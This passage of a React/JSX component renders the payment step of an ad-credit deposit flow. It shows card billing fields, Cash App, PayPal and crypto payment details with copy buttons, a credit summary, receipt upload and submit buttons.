                                    <input value={cardForm.billingHouseNumber} onChange={e => setCardForm({ ...cardForm, billingHouseNumber: e.target.value })} placeholder="House number" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
                                    <input value={cardForm.billingStreet} onChange={e => setCardForm({ ...cardForm, billingStreet: e.target.value })} placeholder="Street" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
                                </div>
                                <div className="grid grid-cols-2 gap-2">
                                    <input value={cardForm.billingCity} onChange={e => setCardForm({ ...cardForm, billingCity: e.target.value })} placeholder="City / Town" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
                                    <input value={cardForm.billingZip} onChange={e => setCardForm({ ...cardForm, billingZip: e.target.value })} placeholder="Postal code" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
                                </div>
                                {cardErrorMessage && (
                                    <div className="p-3 rounded-xl bg-rose-500/[0.08] border border-rose-500/20 text-xs text-rose-200">
                                        {cardErrorMessage}
                                    </div>
                                )}
                            </div>
                            ) : (
                            <div className="bg-white/[0.03] border border-white/[0.06] rounded-xl p-4 space-y-3">
                                {selectedMethodConfig && !["cashapp", "paypal", "crypto"].includes(String(selectedMethodConfig.type || selectedMethodConfig.id || "").toLowerCase()) && (<>
                                    <p className="text-xs font-medium text-zinc-400">{selectedMethodConfig.label} Details</p>
                                    <div className="bg-zinc-900/70 border border-white/[0.04] rounded-lg p-3 text-xs text-zinc-300 break-words whitespace-pre-line leading-relaxed">
                                        {selectedMethodConfig.destination || "Not configured"}
                                    </div>
                                    {selectedMethodConfig.destination && (
                                        <button onClick={() => handleCopy(selectedMethodConfig.destination, "custom")}
                                            className="w-full h-8 flex items-center justify-center gap-2 rounded-lg bg-white/[0.04] border border-white/[0.06] text-xs font-medium text-zinc-300 hover:bg-white/[0.08] transition-colors">
                                            {copied === "custom" ? <><CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" /> Copied</> : <><Copy className="w-3.5 h-3.5" /> Copy details</>}
                                        </button>
                                    )}
                                    {selectedMethodConfig.instructions && <p className="text-[11px] text-zinc-600">{selectedMethodConfig.instructions}</p>}
                                </>)}
                                {method === "cashapp" || selectedMethodConfig?.type === "cashapp" ? (<>
                                    <p className="text-xs font-medium text-zinc-400">Cash App Details</p>
                                    <div className="flex items-center justify-between">
                                        <span className="text-sm font-semibold text-white">{selectedMethodConfig?.destination || adminConfig?.cashappTag || "Not configured"}</span>
                                        {(selectedMethodConfig?.destination || adminConfig?.cashappTag) && <button onClick={() => handleCopy(selectedMethodConfig?.destination || adminConfig.cashappTag, "ca")} className="text-zinc-600 hover:text-blue-400 transition-colors">
                                            {copied === "ca" ? <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                                        </button>}
                                    </div>
                                    <p className="text-[11px] text-zinc-600">{selectedMethodConfig?.instructions || <>Reference: <span className="text-zinc-400 font-mono">{userId.slice(0,8)}</span></>}</p>
                                </>) : null}
                                {method === "paypal" || selectedMethodConfig?.type === "paypal" ? (<>
                                    <p className="text-xs font-medium text-zinc-400">Send PayPal payment to</p>
                                    <div className="flex items-center justify-between">
                                        <span className="text-sm font-semibold text-white">{selectedMethodConfig?.destination || adminConfig?.paypalEmail || "Not configured"}</span>
                                        {(selectedMethodConfig?.destination || adminConfig?.paypalEmail) && <button onClick={() => handleCopy(selectedMethodConfig?.destination || adminConfig.paypalEmail, "pp")} className="text-zinc-600 hover:text-blue-400 transition-colors">
                                            {copied === "pp" ? <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                                        </button>}
                                    </div>
                                    <p className="text-[11px] text-zinc-600">{selectedMethodConfig?.instructions || <>Reference: <span className="text-zinc-400 font-mono">{userId.slice(0,8)}</span></>}</p>
                                </>) : null}
                                {method === "crypto" || selectedMethodConfig?.type === "crypto" ? (<>
                                    <p className="text-xs font-medium text-zinc-400">{cryptoAsset?.toUpperCase()} wallet address</p>
                                    <div className="bg-zinc-900/70 border border-white/[0.04] rounded-lg p-3 font-mono text-xs text-zinc-300 break-all leading-relaxed">
                                        {selectedMethodConfig?.destination || cryptoAddress || "Address not configured"}
                                    </div>
                                    {(selectedMethodConfig?.destination || cryptoAddress) && (
                                        <button onClick={() => handleCopy(selectedMethodConfig?.destination || cryptoAddress, "cr")}
                                            className="w-full h-8 flex items-center justify-center gap-2 rounded-lg bg-white/[0.04] border border-white/[0.06] text-xs font-medium text-zinc-300 hover:bg-white/[0.08] transition-colors">
                                            {copied === "cr" ? <><CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" /> Copied</> : <><Copy className="w-3.5 h-3.5" /> Copy address</>}
                                        </button>
                                    )}
                                    {selectedMethodConfig?.instructions && <p className="text-[11px] text-zinc-600">{selectedMethodConfig.instructions}</p>}
                                </>) : null}
                            </div>
                            )}

                            {/* Summary */}
                            {(bonus > 0 || cryptoDiscount > 0) && (
                                <div className="bg-white/[0.02] border border-white/[0.05] rounded-xl p-3 space-y-2">
                                    {cryptoDiscount > 0 && <div className="flex justify-between text-xs"><span className="text-zinc-500">5% crypto discount</span><span className="text-emerald-400">-${cryptoDiscount.toFixed(2)}</span></div>}
                                    <div className="flex justify-between text-xs"><span className="text-zinc-500">You pay</span><span className="text-white font-medium">${amountToPay.toFixed(2)}</span></div>
                                    {bonus > 0 && <div className="flex justify-between text-xs"><span className="text-zinc-500">Bonus credits</span><span className="text-emerald-400">+${bonus.toFixed(2)}</span></div>}
                                    <div className="flex justify-between text-xs font-semibold border-t border-white/[0.05] pt-2"><span className="text-zinc-300">Total ad credits</span><span className="text-white">${totalCredits.toFixed(2)}</span></div>
                                </div>
                            )}

                            {/* Divider */}
                            {selectedMethodConfig?.type !== "card" && <div className="flex items-center gap-3">
                                <div className="flex-1 h-px bg-white/[0.06]" />
                                <span className="text-xs text-zinc-600">Upload your receipt</span>
                                <div className="flex-1 h-px bg-white/[0.06]" />
                            </div>}

                            {/* Receipt upload */}
                            {selectedMethodConfig?.type === "card" ? null : receiptUrl ? (
                                <div className="flex items-center gap-3 p-4 rounded-xl border border-emerald-500/25 bg-emerald-500/[0.04]">
                                    <div className="w-9 h-9 bg-emerald-500/15 rounded-lg flex items-center justify-center shrink-0">
                                        <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                                    </div>
                                    <div className="flex-1 min-w-0">
                                        <p className="text-sm font-medium text-white truncate">{receiptName || "Receipt uploaded"}</p>
                                        <p className="text-xs text-emerald-400">Ready to submit</p>
                                    </div>
                                    <button onClick={() => { setReceiptUrl(null); setReceiptName(null); }} className="text-xs text-zinc-500 hover:text-red-400 transition-colors shrink-0">Remove</button>
                                </div>
                            ) : (
                                <button onClick={() => fileRef.current?.click()} disabled={uploading}
                                    className="w-full border-2 border-dashed border-white/[0.10] hover:border-blue-500/40 hover:bg-blue-500/[0.03] rounded-xl p-5 flex flex-col items-center gap-2.5 transition-all group">
                                    {uploading ? <Loader2 className="w-6 h-6 animate-spin text-blue-400" /> : <UploadCloud className="w-6 h-6 text-zinc-500 group-hover:text-blue-400 transition-colors" />}
                                    <div className="text-center">
                                        <p className="text-sm font-medium text-zinc-300">{uploading ? "Uploading…" : "Upload payment receipt"}</p>
                                        <p className="text-xs text-zinc-600 mt-0.5">Screenshot or photo of your payment confirmation</p>
                                    </div>
                                </button>
                            )}
                            <input ref={fileRef} type="file" accept="image/*,.pdf" className="hidden" onChange={handleReceiptUpload} />

                            {/* Verification ETA */}
                            {selectedMethodConfig?.type !== "card" && (
                                <div className="flex items-start gap-3 p-3 bg-blue-500/[0.06] border border-blue-500/15 rounded-xl">
                                    <Clock className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
                                    <p className="text-xs text-zinc-400">Verification typically completes in <span className="text-white font-medium">1–5 minutes</span> after your receipt is submitted.</p>
                                </div>
                            )}

                            {(userData?.depositsLocked || userData?.adWalletLocked) && (
                                <div className="p-3 bg-rose-500/[0.07] border border-rose-500/20 rounded-xl text-xs text-rose-200">
                                    Ad wallet deposits are locked for this account.
                                </div>
                            )}
                            <button onClick={handleSubmit} disabled={loading || (selectedMethodConfig?.type !== "card" && !receiptUrl) || userData?.depositsLocked || userData?.adWalletLocked}
                                className={cn("w-full h-11 rounded-xl font-semibold text-sm flex items-center justify-center gap-2 transition-all",
                                    (receiptUrl || selectedMethodConfig?.type === "card") ? "bg-blue-600 hover:bg-blue-700 text-white" : "bg-white/[0.04] border border-white/[0.06] text-zinc-600 cursor-not-allowed")}>
                                {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : selectedMethodConfig?.type === "card" ? "Authorize Card" : "Submit Payment"}
                            </button>
                            <button onClick={() => { setMethod(null); setCryptoAsset(null); setStep(2); }}
                                className="w-full flex items-center justify-center gap-1.5 py-1 text-xs text-zinc-500 hover:text-zinc-300 transition-colors">
                                <ChevronLeft className="w-3.5 h-3.5" /> Change payment method
                            </button>
                        </div>
                    )}

                </div>
            </div>
        </div>
    );
}
